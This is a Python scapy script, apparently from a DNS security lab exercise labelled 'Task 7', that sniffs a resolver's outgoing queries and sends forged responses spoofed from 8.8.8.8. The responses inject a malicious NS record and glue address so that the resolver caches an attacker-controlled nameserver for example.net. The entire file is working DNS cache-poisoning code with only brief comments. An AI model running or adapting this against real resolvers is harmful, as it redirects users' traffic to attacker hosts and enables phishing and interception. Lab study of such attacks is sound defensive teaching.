#!/usr/bin/env python3
"""
Task 7: Authority Section Attack
This script injects malicious NS records in the authority section.
"""

from scapy.all import *

# Configuration
DNS_SERVER_IP = "10.9.0.16"
ATTACKER_IP = "10.9.0.17"
TARGET_DOMAIN = "www.example.net"
ATTACKER_NS = "ns.attacker32.com"
ATTACKER_NS_IP = "10.9.0.17"
DNS_SRC_PORT = 33333

def authority_section_attack(pkt):
    """
    Send DNS response with malicious authority section
    """
    if DNS in pkt and pkt[DNS].qr == 0:
        query_name = pkt[DNS].qd.qname.decode('utf-8')

        if TARGET_DOMAIN in query_name:
            print(f"[+] Intercepted query: {query_name}")
            print(f"[+] Injecting NS record for example.net")

            # Create fake response with authority section
            ip = IP(dst=DNS_SERVER_IP, src="8.8.8.8")
            udp = UDP(dport=DNS_SRC_PORT, sport=53)

            dns = DNS(
                id=pkt[DNS].id,
                qr=1,  # Response
                aa=1,  # Authoritative
                qd=pkt[DNS].qd,
                # Answer section - respond to the original query
                an=DNSRR(
                    rrname=pkt[DNS].qd.qname,
                    ttl=300,
                    rdata=ATTACKER_IP
                ),
                # Authority section - inject malicious NS record
                ns=DNSRR(
                    rrname=b"example.net.",
                    type=2,  # NS record
                    ttl=86400,
                    rdata=ATTACKER_NS
                ),
                # Additional section - provide A record for the NS
                ar=DNSRR(
                    rrname=ATTACKER_NS.encode(),
                    ttl=86400,
                    rdata=ATTACKER_NS_IP
                )
            )

            spoofed_pkt = ip/udp/dns
            for i in range(10):
                send(spoofed_pkt, verbose=0)

            print(f"[+] Injected NS record: example.net -> {ATTACKER_NS}")
            print(f"[+] Next query for *.example.net will go to attacker!")
            print("[!] Check cache for NS record")
            print("-" * 60)

print("=" * 60)
print("Task 7: Authority Section Attack")
print("=" * 60)
print(f"Target: {TARGET_DOMAIN}")
print(f"Malicious NS: {ATTACKER_NS} -> {ATTACKER_NS_IP}")
print()
print("Trigger with: docker exec -it user-machine dig www.example.net")
print("Check with: rndc dumpdb -cache && grep example.net /var/cache/bind/dump.db")
print("=" * 60)
print()

sniff(filter=f"udp src port {DNS_SRC_PORT} and dst port 53", prn=authority_section_attack)
